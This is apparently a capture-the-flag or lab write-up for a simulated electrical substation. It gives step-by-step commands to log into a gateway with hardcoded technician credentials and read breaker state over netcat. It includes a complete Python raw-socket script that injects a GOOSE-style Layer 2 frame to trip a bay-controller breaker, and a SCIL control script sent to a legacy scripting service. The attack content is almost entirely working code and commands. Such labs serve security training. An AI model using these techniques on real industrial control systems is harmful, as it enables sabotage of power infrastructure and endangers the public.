# Red-Writeup: Stage 5 — Substation Gateway and Bay Controller


Part 1 — Stage 4b: Access Substation Gateway
Step 1 — SSH into substation-gw

Use the same field technician credentials:

ssh field_tech@10.100.2.254

Password:

FieldTech2024!

If SSH asks about host authenticity, type:

yes
Step 2 — Check gateway interfaces

Inside substation-gw, run:

ip addr show

You should see that the gateway has two network sides:

Station Zone interface → 10.100.2.254
Process Zone interface → 10.100.3.1

Now identify the process-zone interface automatically:

ip -o addr show | grep '10.100.3.'

You may see something like:

eth1    inet 10.100.3.1/24

So the process-zone interface is probably:

eth1
Step 3 — Collect process-zone MAC address

Run:

IFACE=$(ip -o addr show | grep '10.100.3.' | awk '{print $2}' | head -n 1)
echo "$IFACE"
cat /sys/class/net/$IFACE/address

Example output:

eth1
02:42:0a:64:03:01

This MAC address is the Stage 4b artifact.

What this proves:

The attacker has compromised the substation gateway and confirmed that it has process-zone access.
Part 2 — Stage 5a: GOOSE-style L2 Trip Injection

This is the main visual/impact part.

Before the attack, the bay-controller breaker should be:

CLOSED

After the attack, it should become:

TRIPPED
Step 4 — Read current breaker state before attack

Still inside substation-gw, run:

echo 'READ XCBR1$ST$Pos$stVal' | nc 10.100.2.10 102

Expected before attack:

CLOSED

This is the before state.

Step 5 — Read GOOSE configuration revision

Run:

echo 'READ LLN0$CF$ConfRev' | nc 10.100.2.10 102

Expected output:

7366

This value is important because the bay-controller only accepts packets with the correct confRev.

Your validation script also reads LLN0$CF$ConfRev from 10.100.2.10:102 before building the GOOSE packet.

Step 6 — Send the GOOSE-style trip packet

Use this from inside substation-gw.

This sends a raw Ethernet frame on the process-zone interface.

sudo python3 - <<'PY'
import socket, struct, hashlib, subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.100.2.10", 102))
s.sendall(b"READ LLN0$CF$ConfRev\n")
conf_rev = int(s.recv(1024).decode().strip())
s.close()

iface = next((l.split()[1] for l in subprocess.check_output(["ip","-o","addr","show"]).decode().splitlines() if "10.100.3." in l), "eth1")
src_mac = bytes.fromhex(open(f"/sys/class/net/{iface}/address").read().strip().replace(":",""))
dst_mac = bytes.fromhex("010ccd018a04")

packet = struct.pack("!6s6sH", dst_mac, src_mac, 0x88B8) + struct.pack("!HHIIIB", 0x8A04, 17, conf_rev, 1, 1, 1)

sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x88B8))
sock.bind((iface, 0))
sock.send(packet)

print(conf_rev, iface, hashlib.sha256(packet).hexdigest())
PY

Copy the value printed after:

Packet SHA256:

That SHA256 hash is the Stage 5a artifact.

Your reference attack script computes Stage 5a from the SHA256 hash of the packet bytes, so this is the correct artifact to preserve.

Step 7 — Verify breaker state after attack

Run:

echo 'READ XCBR1$ST$Pos$stVal' | nc 10.100.2.10 102

Expected after attack:

TRIPPED

This proves the operational impact:

Before attack → CLOSED
After attack  → TRIPPED

So Stage 5a attack achieved:

GOOSE-style Layer 2 trip injection accepted by bay-controller.
Part 3 — Stage 5b: Legacy SCIL Scripting Exploitation

Now you abuse the legacy scripting service on the bay-controller.

Target:

10.100.2.10:9022
Step 8 — Create the SCIL script

Inside substation-gw, run:

cat > script.scil <<'EOF'
; SCIL control script
#SET IX:Pioa = 2947
#SET IX:PValue = 1
EOF

This script targets IOA:

2947

and sets the value to:

1

The reference script sends the same values to the SCIL interface, using SCIL_EXPECTED_IOA and PValue = 1.

Step 9 — Send the script to the SCIL service

Run:

nc 10.100.2.10 9022 < script.scil

Expected output:

TOKEN_OK:<timestamp>:<client_ip>:<script_hash>

Example:

TOKEN_OK:1783149301:10.100.2.254:ab12cd34ef56...
